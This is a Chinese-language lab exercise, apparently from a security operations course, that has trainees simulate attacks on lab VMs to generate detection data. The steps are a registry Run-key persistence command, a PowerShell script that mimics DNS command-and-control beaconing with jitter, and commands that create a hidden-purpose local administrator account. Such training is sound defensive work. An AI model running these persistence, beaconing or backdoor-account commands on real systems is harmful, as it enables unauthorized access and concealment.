﻿# 模块 7 - 实验室 1 - 练习 5 - 进行攻击

### 任务 1：攻击配置了 Defender for Endpoint 的 Windows。

在此任务中，你将在配置了 Microsoft Defender for Endpoint 的主机执行攻击。

1. 使用以下密码以管理员身份登录到 WIN1 虚拟机：**Pa55w.rd**。  

2. 在任务栏的搜索框中，输入 *“Command”*。  命令提示符将显示在搜索结果中。  右键单击命令提示符，并选择 **“以管理员身份运行”**。确认显示的任何用户帐户控制提示。

3. 在命令提示符中，在每一行中输入命令，并在每一行后按 Enter 键：
```
cd \
mkdir temp
cd temp
```
4. 攻击 1 - 复制并运行此命令：

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
```

5. 攻击 3 - 复制并运行此命令：

```
notepad c2.ps1
```
选择 **“是”** 以创建新文件并将以下 PowerShell 脚本复制到 c2.ps1，然后选择 **“保存”**。

**备注** 粘贴到虚拟机可能有长度限制。  将此脚本分为三部分进行粘贴，以便将所有脚本粘贴到虚拟机中。  确保脚本在记事本 c2.ps1 文件中的外观与在这些说明中一致。

```


param(
    [string]$Domain = "microsoft.com",
    [string]$Subdomain = "subdomain",
    [string]$Sub2domain = "sub2domain",
    [string]$Sub3domain = "sub3domain",
    [string]$QueryType = "TXT",
        [int]$C2Interval = 8,
        [int]$C2Jitter = 20,
        [int]$RunTime = 240
)


$RunStart = Get-Date
$RunEnd = $RunStart.addminutes($RunTime)

$x2 = 1
$x3 = 1 
Do {
    $TimeNow = Get-Date
    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout

    if ($x2 -eq 3 )
    {
        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        
        $x2 = 1

    }
    else
    {
        $x2 = $x2 + 1
    }
    
    if ($x3 -eq 7 )
    {

        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout

        $x3 = 1
        
    }
    else
    {
        $x3 = $x3 + 1
    }


    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
    Start-Sleep -Seconds $Jitter
}
Until ($TimeNow -ge $RunEnd)

```

在命令提示符中输入以下内容，在每一行中输入命令，并在每一行后按 Enter 键：
```
powershell
.\c2.ps1
```
**备注：** 你将看到解析错误。这在预料之中。
让此命令/powershell 脚本在后台运行。不要关闭窗口。  该命令需要在数小时内生成日志条目。  在此脚本运行期间，你可以继续进行下一项任务和下一个练习。  此任务创建的数据稍后将在威胁搜寻中使用。  此过程不会创造大量的数据或处理。

### 任务 2：攻击配置了 Sysmon 的 Windows

在此任务中，你将在配置了安全事件连接器和 Sysmon 的主机上执行攻击。

1. 以管理员身份使用密码登录到 WIN2 虚拟机：**Pa55w.rd**。  

2. 在任务栏的搜索框中，输入 *“CMD”*。  命令提示符将显示在搜索结果中。  右键单击命令提示符，并选择 **“以管理员身份运行”**。

3. 在命令提示符中，在每一行中输入命令，并在每一行后按 Enter 键：
```
cd \
mkdir temp
cd \temp
```

4. 攻击 1 - 复制并运行此命令：

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
```

5. 攻击 2 - 复制并运行此命令，在每一行中输入命令，并在每一行后按 Enter 键：

```
net user theusernametoadd /add
net user theusernametoadd ThePassword1!
net localgroup administrators theusernametoadd /add
```

## 转到练习 6